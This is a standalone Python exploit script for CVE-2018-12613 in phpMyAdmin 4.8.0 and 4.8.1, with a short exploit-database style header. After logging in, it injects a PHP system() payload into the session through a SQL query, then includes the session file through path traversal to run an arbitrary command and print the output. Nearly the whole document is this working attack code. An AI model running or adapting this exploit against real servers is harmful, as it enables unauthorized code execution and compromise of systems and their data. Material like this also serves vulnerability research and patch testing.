# Exploit Title: phpMyAdmin 4.8.1 - Remote Code Execution (RCE)
# Date: 17/08/2021
# Exploit Author: samguy
# Vulnerability Discovery By: ChaMd5 & Henry Huang
# Vendor Homepage: http://www.phpmyadmin.net
# Software Link: https://github.com/phpmyadmin/phpmyadmin/archive/RELEASE_4_8_1.tar.gz
# Version: 4.8.1
# Tested on: Linux - Debian Buster (PHP 7.3)
# CVE : CVE-2018-12613

#!/usr/bin/env python

import re, requests, sys

# check python major version
if sys.version_info.major == 3:
  import html
else:
  from six.moves.html_parser import HTMLParser
  html = HTMLParser()

if len(sys.argv) < 7:
  usage = """Usage: {} [ipaddr] [port] [path] [username] [password] [command]
Example: {} 192.168.56.65 8080 /phpmyadmin username password whoami"""
  print(usage.format(sys.argv[0],sys.argv[0]))
  exit()

def get_token(content):
  s = re.search('token"\s*value="(.*?)"', content)
  token = html.unescape(s.group(1))
  return token

ipaddr = sys.argv[1]
port = sys.argv[2]
path = sys.argv[3]
username = sys.argv[4]
password = sys.argv[5]
command = sys.argv[6]

url = "http://{}:{}{}".format(ipaddr,port,path)

# 1st req: check login page and version
url1 = url + "/index.php"
r = requests.get(url1)
content = r.content.decode('utf-8')
if r.status_code != 200:
  print("Unable to find the version")
  exit()

s = re.search('PMA_VERSION:"(\d+\.\d+\.\d+)"', content)
version = s.group(1)
if version != "4.8.0" and version != "4.8.1":
  print("The target is not exploitable".format(version))
  exit()

# get 1st token and cookie
cookies = r.cookies
token = get_token(content)

# 2nd req: login
p = {'token': token, 'pma_username': username, 'pma_password': password}
r = requests.post(url1, cookies = cookies, data = p)
content = r.content.decode('utf-8')
s = re.search('logged_in:(\w+),', content)
logged_in = s.group(1)
if logged_in == "false":
  print("Authentication failed")
  exit()

# get 2nd token and cookie
cookies = r.cookies
token = get_token(content)

# 3rd req: execute query
url2 = url + "/import.php"
# payload
payload = '''select '<?php system("{}") ?>';'''.format(command)
p = {'table':'', 'token': token, 'sql_query': payload }
r = requests.post(url2, cookies = cookies, data = p)
if r.status_code != 200:
  print("Query failed")
  exit()

# 4th req: execute payload
session_id = cookies.get_dict()['phpMyAdmin']
url3 = url + "/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_{}".format(session_id)
r = requests.get(url3, cookies = cookies)
if r.status_code != 200:
  print("Exploit failed")
  exit()

# get result
content = r.content.decode('utf-8', errors="replace")
s = re.search("select '(.*?)\n'", content, re.DOTALL)
if s != None:
  print(s.group(1))